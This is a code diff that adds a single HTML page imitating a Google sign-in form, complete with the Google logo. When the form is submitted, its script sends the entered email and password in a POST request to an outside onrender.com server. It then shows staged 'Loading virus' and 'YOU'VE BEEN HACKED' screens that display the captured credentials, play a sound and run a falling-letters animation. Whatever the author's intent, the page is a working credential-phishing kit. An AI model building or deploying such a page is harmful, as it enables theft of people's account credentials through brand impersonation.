@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            font-family: "Roboto", sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            background-color: white;
+            overflow: hidden;
+            position: relative;
+            color: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-container {
+            background: white;
+            padding: 50px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            width: 400px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        .google-logo img {
+            width: 200px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            font-size: 24px;
+            color: #202124;
+            margin-top: 0;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #dcdfe1;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            border-color: #1a73e8;
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1a73e8;
+            border: none;
+            color: white;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #1669c1;
+        }
+
+ 
+        .hacked-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #003a30;
+            
+            color: red;
+            font-size: 50px;
+            font-weight: bold;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 1s ease;
+            text-align: center;
+            font-family: monospace;
+        }
+
+        .hacked-text {
+            animation: colorCycle 1s infinite alternate;
+        }
+
+        @keyframes colorCycle {
+            0% {
+                color: red;
+            }
+
+            25% {
+                color: yellow;
+            }
+
+            50% {
+                color: green;
+            }
+
+            75% {
+                color: blue;
+            }
+
+            100% {
+                color: purple;
+            }
+        }
+
+        .hacked-screen p {
+            font-size: 24px;
+            margin-top: 10px;
+        }
+
+
+        .loading-virus {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: black;
+            color: green;
+            font-size: 30px;
+            font-weight: bold;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            opacity: 0;
+            visibility: hidden;
+            text-align: center;
+            font-family: monospace;
+        }
+
+        @keyframes loadingText {
+            0% {
+                content: "Loading virus.";
+            }
+
+            33% {
+                content: "Loading virus..";
+            }
+
+            66% {
+                content: "Loading virus...";
+            }
+
+            100% {
+                content: "Loading virus.";
+            }
+        }
+
+        .loading-virus::after {
+            content: "Loading virus.";
+            animation: loadingText 1s infinite;
+        }
+
+        .user-info {
+            margin-top: 20px;
+            font-size: 20px;
+            background: rgba(255, 0, 0, 0.2);
+            padding: 20px;
+            border-radius: 5px;
+        }
+
+        /* Falling letters animation */
+        .random-letters {
+            position: absolute;
+            color: lightgreen;
+            font-size: 24px;
+            animation: randomLetterMovement 3s linear infinite;
+            z-index: 0;
+        }
+
+        @keyframes randomLetterMovement {
+            0% {
+                top: -30px;
+                opacity: 1;
+            }
+
+            100% {
+                top: 100vh;
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-container">
+        <div class="google-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
+        </div>
+        <h2>Login to Your Google Account</h2>
+        <form id="login-form">
+            <input type="email" id="email" name="email" placeholder="Enter your email" required>
+            <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            <button type="submit">Log in</button>
+        </form>
+    </div>
+
+    <!-- Fake Loading Virus Screen -->
+    <div class="loading-virus" id="loading-virus">Loading virus...</div>
+
+    <!-- Fake Hacked Screen -->
+    <div class="hacked-screen" id="hacked-screen">
+        <div class="hacked-text">YOU'VE BEEN HACKED!</div>
+        <p>All your data has been stolen.<br>Your account is now compromised.</p>
+        <div class="user-info" id="user-info"></div>
+    </div>
+
+    <audio id="hacked-audio">
+        <source src="https://www.myinstants.com/media/sounds/windows-xp-error.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        // Generate random falling letters
+        function generateRandomLetters() {
+            const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            const letterContainer = document.createElement("div");
+            letterContainer.classList.add("random-letters");
+            letterContainer.textContent = letters.charAt(Math.floor(Math.random() * letters.length));
+            letterContainer.style.left = Math.random() * window.innerWidth + "px";  // Random horizontal position
+            letterContainer.style.animationDuration = Math.random() * 2 + 1 + "s"; // Random speed between 1s and 3s
+            document.body.appendChild(letterContainer);
+
+            setTimeout(() => {
+                document.body.removeChild(letterContainer);
+            }, 3000);  
+        }
+
+        document.getElementById("login-form").addEventListener("submit", function (event) {
+            event.preventDefault(); 
+
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+
+       
+            fetch("https://your-app-name.onrender.com/login", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
+            });
+
+            document.querySelector(".login-container").style.display = "none";
+
+            let loadingScreen = document.getElementById("loading-virus");
+            loadingScreen.style.visibility = "visible";
+            loadingScreen.style.opacity = "1";
+
+            setTimeout(() => {
+                loadingScreen.style.visibility = "hidden";
+                loadingScreen.style.opacity = "0";
+
+                document.body.style.backgroundColor = "#003a30";  
+                let hackedScreen = document.getElementById("hacked-screen");
+                hackedScreen.style.visibility = "visible";
+                hackedScreen.style.opacity = "1";
+
+                document.getElementById("user-info").innerHTML = `
+                    <p>Email: <strong>${email}</strong></p>
+                    <p>Password: <strong>${password}</strong></p>
+                `;
+
+                document.getElementById("hacked-audio").play();
+
+                setInterval(generateRandomLetters, 1); 
+
+                setTimeout(() => {
+                    location.reload();
+                }, 25000);
+            }, 3000);
+        });
+    </script>
+
+</body>
+
+</html>
